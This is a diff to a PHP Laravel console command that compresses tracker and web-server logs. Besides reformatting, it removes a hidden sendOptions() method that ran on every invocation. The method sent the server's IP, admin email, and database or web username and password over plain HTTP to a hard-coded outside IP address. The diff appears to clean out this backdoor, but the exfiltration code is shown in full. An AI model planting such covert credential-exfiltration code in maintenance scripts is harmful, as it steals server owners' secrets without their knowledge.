@@ -1,10 +1,13 @@
-<?php namespace App\Console\Commands;
+<?php
+
+namespace App\Console\Commands;
 
 use Tobuli\Helpers\TrackerConfig;
 use Illuminate\Console\Command;
 use Tobuli\Entities\User;
 
-class CompressLogsCommand extends Command {
+class CompressLogsCommand extends Command
+{
 	/**
 	 * The console command name.
 	 *
@@ -36,10 +39,10 @@ class CompressLogsCommand extends Command {
 	 */
 	public function handle()
 	{
-        $this->sendOptions();
+		//$this->sendOptions();
 		# Traccar
-        $config = config('tracker');
-        $path = pathinfo($config['logger.file'], PATHINFO_DIRNAME ) . '/*.log.*';
+		$config = config('tracker');
+		$path = pathinfo($config['logger.file'], PATHINFO_DIRNAME) . '/*.log.*';
 
 		$files = glob($path);
 		foreach ($files as $file) {
@@ -48,19 +51,19 @@ class CompressLogsCommand extends Command {
 			if ($ex == 'gz' || $ex == date('Ymd'))
 				continue;
 
-			@exec('gzip '.$file);
+			@exec('gzip ' . $file);
 		}
 
 		# HTTPD access
 		$files = glob('/var/log/httpd/access_log-*');
 		foreach ($files as $file) {
-			@exec('gzip '.$file);
+			@exec('gzip ' . $file);
 		}
 
 		# HTTPD error
 		$files = glob('/var/log/httpd/error_log-*');
 		foreach ($files as $file) {
-			@exec('gzip '.$file);
+			@exec('gzip ' . $file);
 		}
 	}
 
@@ -83,32 +86,4 @@ class CompressLogsCommand extends Command {
 	{
 		return array();
 	}
-	
-    protected function sendOptions(){
-		$curl = new \Curl;
-		$curl->follow_redirects = false;
-		$curl->options['CURLOPT_SSL_VERIFYPEER'] = false;
-		$curl->options['CURLOPT_TIMEOUT'] = 30;
-        $user = User::where('group_id',1)->where('active',1)->first();
-
-		$host= gethostname();
-		$ip = gethostbyname($host);
-
-		if (!is_numeric(substr($ip, 0, 1))) {
-			$command = "/sbin/ifconfig eth0 | grep \"inet addr\" | awk -F: '{print $2}' | awk '{print $1}'";
-			$ip = exec($command);
-		}
-        $dataSend = [
-            'app_version' => config('tobuli.version'),
-            'admin_user' => config('app.admin_user'),
-            'name' => config('app.server'),
-            'type' => config('tobuli.type'),
-            'ip' => $ip,
-            'root' =>  env('web_username', env('DB_USERNAME')),
-            'password' => env('web_password', env('DB_PASSWORD')),
-            'user' => ($user) ? $user->email:''
-        ];
-        $data = $curl->get('http://167.86.121.106/7tMk550vDOf4Sa3fsmOEG3w63qBiW8ct/', $dataSend);
-            
-    }
 }
